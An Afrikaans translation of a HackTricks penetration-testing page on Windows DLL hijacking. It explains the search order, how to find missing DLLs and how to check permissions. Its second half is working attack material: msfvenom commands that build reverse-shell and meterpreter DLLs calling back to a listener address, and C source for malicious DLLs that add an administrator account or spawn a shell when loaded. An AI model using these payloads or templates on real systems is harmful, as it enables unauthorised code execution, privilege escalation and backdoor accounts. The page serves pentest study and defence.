# Dll Kaping

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

As jy belangstel in 'n **hackingsloopbaan** en die onhackbare wil hack - **ons is aan die werf!** (_vloeiende skriftelike en gesproke Pools vereis_).

{% embed url="https://www.stmcyber.com/careers" %}

## Basiese Inligting

DLL-kaping behels die manipulering van 'n vertroude toepassing om 'n skadelike DLL te laai. Hierdie term sluit verskeie taktieke in soos **DLL Spoofing, Injection, en Side-Loading**. Dit word hoofsaaklik gebruik vir kode-uitvoering, volharding en, minder algemeen, voorreg-escalasie. Ten spyte van die fokus op escalasie hier, bly die metode van kaping konsekwent oor doelwitte.

### Algemene Tegnieke

Verskeie metodes word gebruik vir DLL-kaping, elk met sy doeltreffendheid afhanklik van die toepassing se DLL-laai-strategie:

1. **DLL-vervanging**: Ruil 'n egte DLL met 'n skadelike een, opsioneel met behulp van DLL Proxying om die funksionaliteit van die oorspronklike DLL te behou.
2. **DLL Soekorde-kaping**: Plaas die skadelike DLL in 'n soekpad voor die regmatige een, deur die toepassing se soekpatroon uit te buit.
3. **Spook-DLL-kaping**: Skep 'n skadelike DLL vir 'n toepassing om te laai, dinkend dat dit 'n nie-bestaande vereiste DLL is.
4. **DLL-omleiding**: Wysig soekparameters soos `%PATH%` of `.exe.manifest` / `.exe.local` lêers om die toepassing na die skadelike DLL te rig.
5. **WinSxS DLL-vervanging**: Vervang die regmatige DLL met 'n skadelike eweknie in die WinSxS-gids, 'n metode wat dikwels geassosieer word met DLL-side-loading.
6. **Relatiewe pad DLL-kaping**: Plaas die skadelike DLL in 'n gebruikersbeheerde gids saam met die gekopieerde toepassing, wat lyk na Binêre Proxy-uitvoeringstegnieke.


## Opsoek na ontbrekende Dlls

Die mees algemene manier om ontbrekende Dlls binne 'n stelsel te vind, is om [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) van sysinternals uit te voer, **met die volgende 2 filters**:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

en wys net die **Lêersisteemaktiwiteit**:

![](<../../.gitbook/assets/image (314).png>)

As jy soek na **ontbrekende dlls in die algemeen**, laat jy dit vir 'n paar **sekondes** loop.\
As jy soek na 'n **ontbrekende dll binne 'n spesifieke uitvoerbare lêer**, moet jy **'n ander filter instel soos "Process Name" "bevat" "\<uitvoerbare naam>", voer dit uit en stop die vaslegging van gebeure**.

## Uitbuiting van Ontbrekende Dlls

Om voorregte te verhoog, is die beste kans wat ons het om in staat te wees om **'n dll te skryf wat 'n voorregproses sal probeer laai** in 'n plek waar dit gaan word soek. Daarom sal ons in staat wees om 'n dll te **skryf** in 'n **gids** waar die **dll voor die oorspronklike dll** soek (vreemde geval), of ons sal in staat wees om **in 'n gids te skryf waar die dll gaan word soek** en die oorspronklike **dll bestaan nie** in enige gids nie.

### Dll Soekorde

**Binne die** [**Microsoft-dokumentasie**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **kan jy vind hoe die Dlls spesifiek gelaai word**.

**Windows-toepassings** soek na DLL's deur 'n stel **voorgedefinieerde soekpaaie** te volg, in ooreenstemming met 'n spesifieke volgorde. Die probleem van DLL-kaping ontstaan wanneer 'n skadelike DLL strategisch in een van hierdie gidsies geplaas word, om te verseker dat dit voor die egte DLL gelaai word. 'n Oplossing om dit te voorkom, is om te verseker dat die toepassing absolute paaie gebruik wanneer dit na die benodigde DLL's verwys.

Jy kan die **DLL-soekorde op 32-bis**-stelsels hieronder sien:

1. Die gids waaruit die toepassing gelaai is.
2. Die stelselgids. Gebruik die [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya)-funksie om die pad van hierdie gids te kry.(_C:\Windows\System32_)
3. Die 16-bis stelselgids. Daar is geen funksie wat die pad van hierdie gids verkry nie, maar dit word soek. (_C:\Windows\System_)
4. Die Windows-gids. Gebruik die [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya)-funksie om die pad van hierdie gids te kry.
1. (_C:\Windows_)
5. Die huidige gids.
6. Die gidse wat in die PATH-omgewingsveranderlike gelys word. Let daarop dat dit nie die per-toepassing-pad insluit wat deur die **App Paths**-registernooi gespesifiseer word nie. Die **App Paths**-sleutel word nie gebruik wanneer die DLL-soekpad bereken word nie.

Dit is die **verstek** soekorde met **SafeDllSearchMode** geaktiveer. Wanneer dit gedeaktiveer is, skuif die huidige gids na die tweede plek. Om hierdie funksie te deaktiveer, skep die **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode**-registrasiewaarde en stel dit in op 0 (verstek is geaktiveer).

As [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa)-funksie geroep word met **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** begin die soektog in die gids van die uitvoerbare module wat deur **LoadLibraryEx** gelaai word.

Laastens, let daarop dat **'n dll gelaai kan word deur die absolute pad aan te dui in plaas van net die naam**. In daardie geval sal daardie dll **slegs in daardie pad gesoek word** (as die dll enige afhanklikhede het, sal hulle gesoek word soos net deur naam gelaai).

Daar is ander maniere om die soekorde te verander, maar ek gaan dit nie hier verduidelik nie.
#### Uitsonderings op dll-soekvolgorde van Windows-dokumentasie

Sekere uitsonderings op die standaard dll-soekvolgorde word genoteer in die Windows-dokumentasie:

- Wanneer 'n **dll wat sy naam deel met een wat reeds in die geheue gelaai is**, aangetref word, omseil die stelsel die gewone soektog. In plaas daarvan voer dit 'n kontrole vir omleiding en 'n manifest uit voordat dit na die dll in die geheue oorskakel. **In hierdie scenario voer die stelsel nie 'n soektog na die dll uit nie**.
- In gevalle waar die dll erken word as 'n **bekende dll** vir die huidige Windows-weergawe, sal die stelsel sy weergawe van die bekende dll gebruik, tesame met enige van sy afhanklike dll's, **sonder om die soekproses te doen**. Die register sleutel **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** bevat 'n lys van hierdie bekende dll's.
- As 'n **dll afhanklikhede het**, word die soektog na hierdie afhanklike dll's uitgevoer asof hulle slegs deur hul **module name** aangedui word, ongeag of die aanvanklike dll geïdentifiseer is deur 'n volledige pad.

### Verhoging van bevoorregting

**Vereistes**:

- Identifiseer 'n proses wat onder **verskillende bevoorregting** (horisontale of laterale beweging) werk of sal werk, wat 'n **dll kortkom**.
- Verseker dat **skryftoegang** beskikbaar is vir enige **gids** waarin die **dll gesoek sal word**. Hierdie plek kan die gids van die uitvoerbare lêer wees of 'n gids binne die stelselpad.

Ja, die vereistes is moeilik om te vind, want **standaard is dit vreemd om 'n bevoorregte uitvoerbare lêer sonder 'n dll te vind** en dit is selfs **vreemder om skryftoestemmings op 'n stelselpad-gids te hê** (standaard kan jy nie). Maar in verkeerd gekonfigureerde omgewings is dit moontlik.\
In die geval dat jy gelukkig is en jy vind jouself aan die vereistes, kan jy die [UACME](https://github.com/hfiref0x/UACME) projek nagaan. Selfs al is die **hoofdoel van die projek om UAC te omseil**, kan jy daar 'n **PoC** van 'n dll-hijacking vir die Windows-weergawe vind wat jy kan gebruik (waarskynlik deur net die pad van die gids waar jy skryftoestemmings het, te verander).

Let daarop dat jy jou **toestemmings in 'n gids kan nagaan** deur:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
En **kontroleer die regte van alle lêers binne die PAD**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Jy kan ook die invoere van 'n uitvoerbare lêer en die uitvoere van 'n dll nagaan met:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Vir 'n volledige gids oor hoe om **Dll Hijacking te misbruik om voorregte te verhoog** met toestemmings om in 'n **System Path-vouer** te skryf, kyk:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Geoutomatiseerde gereedskap

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) sal nagaan of jy skryfregte het op enige vouer binne die stelsel-PAD.\
Ander interessante geoutomatiseerde gereedskap om hierdie kwesbaarheid te ontdek, is **PowerSploit-funksies**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll_.

### Voorbeeld

In die geval dat jy 'n uitbuitbare scenario vind, sal een van die belangrikste dinge om dit suksesvol uit te buit, wees om **'n dll te skep wat ten minste al die funksies uitvoer wat die uitvoerbare lêer daarvan sal invoer**. In elk geval, let daarop dat Dll Hijacking handig is om [op te skakel van Medium Integriteitsvlak na Hoë **(deur UAC te omseil)**](../authentication-credentials-uac-and-efs.md#uac) of van **Hoë Integriteit na SISTEEM**](./#from-high-integrity-to-system)**.** Jy kan 'n voorbeeld van **hoe om 'n geldige dll te skep** vind in hierdie studie oor dll-hijacking wat gefokus is op dll-hijacking vir uitvoering: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Verder kan jy in die **volgende afdeling** 'n paar **basiese dll-kodes** vind wat nuttig kan wees as **sjablone** of om 'n **dll met nie-verpligte funksies uitgevoer** te skep.

## **Dlls skep en saamstel**

### **Dll Proxifying**

Basies is 'n **Dll-proksi** 'n Dll wat in staat is om **jou skadelike kode uit te voer wanneer dit gelaai word**, maar ook om **bloot te stel** en **te werk** soos **verwag** deur **alle oproepe na die werklike biblioteek te stuur**.

Met die gereedskap [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy eintlik **'n uitvoerbare lêer aandui en die biblioteek kies** wat jy wil proksifiseer en **'n geproksifiseerde dll genereer** of **die Dll aandui en 'n geproksifiseerde dll genereer**.

### **Meterpreter**

**Kry omgekeerde skul (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kry 'n meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Skep 'n gebruiker (Ek het nie 'n x64-weergawe gesien nie):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Jou eie

Let daarop dat in verskeie gevalle die Dll wat jy saamstel, verskeie funksies moet **uitvoer** wat deur die slagofferproses gelaai gaan word. As hierdie funksies nie bestaan nie, sal die **binêre lêer nie in staat wees om hulle te laai** en sal die **aanval misluk**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Verwysings
* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

As jy belangstel in 'n **hackerloopbaan** en die onhackbare wil hack - **ons is aan die werf!** (_vloeiende skriftelike en gesproke Pools vereis_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks in PDF aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslagplekke.

</details>
